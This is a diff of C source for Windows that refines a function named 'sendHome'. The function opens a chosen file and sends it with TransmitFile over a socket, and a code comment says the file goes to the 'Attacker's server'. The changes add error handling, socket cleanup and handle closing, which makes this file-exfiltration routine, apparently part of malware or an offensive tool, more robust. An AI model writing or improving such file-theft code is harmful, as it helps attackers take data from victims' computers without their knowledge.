@@ -84,24 +84,47 @@ int sendHome(char* buffer, int file)
 	if (file)
 	{
 		//Open the file the user selected.
-		HANDLE hFile = CreateFileA(buffer, GENERIC_READ, FILE_SHARE_READ, NULL,
+		HANDLE handle = CreateFileA(buffer, GENERIC_READ, FILE_SHARE_READ, NULL,
 			OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-		if (hFile == INVALID_HANDLE_VALUE)
+
+		if (handle == INVALID_HANDLE_VALUE)
 		{
+			_tprintf(_T("ERROR: Can't open handle %ld\n"));
+			closesocket(sock);
+			WSACleanup();
 			return 1;
 		}
 
 		//Get file size. 
-		GetFileSize(hFile, NULL);
-		if (GetFileSizeEx(hFile, &liFileSize) == FALSE)
+		GetFileSize(handle, NULL);
+		if (GetFileSizeEx(handle, &liFileSize) == FALSE)
 		{
+			_tprintf(_T("ERROR: GetFileSize %ld\n"));
+			closesocket(sock);
+			WSACleanup();
 			return 1;
 		}
 
 		//Send files using TransmitFile to Attacker's server.
-		if (TransmitFile(sock, hFile, 0, 0, NULL, NULL, TF_USE_DEFAULT_WORKER) == FALSE)
+		if (TransmitFile(sock, handle, 0, 0, NULL, NULL, TF_USE_DEFAULT_WORKER) == FALSE)
 		{
 			_tprintf(_T("TransmitFile function failed with error: %ld\n"), WSAGetLastError());
+			closesocket(sock);
+			WSACleanup();
+
+			if (!CloseHandle(handle))
+			{
+				_tprintf(_T("ERROR: CloseHandle function call."));
+				return 1;
+			}
+
+			return 1;
+		}
+
+		//Close handle.
+		if (!CloseHandle(handle))
+		{
+			_tprintf(_T("ERROR: CloseHandle function call."));
 			return 1;
 		}
 	}
@@ -150,6 +173,7 @@ int sendHome(char* buffer, int file)
 	result = closesocket(sock);
 	if (result == SOCKET_ERROR)
 	{
+		_tprintf(_T("ERROR: closesocket"));
 		WSACleanup();
 		return 1;
 	}
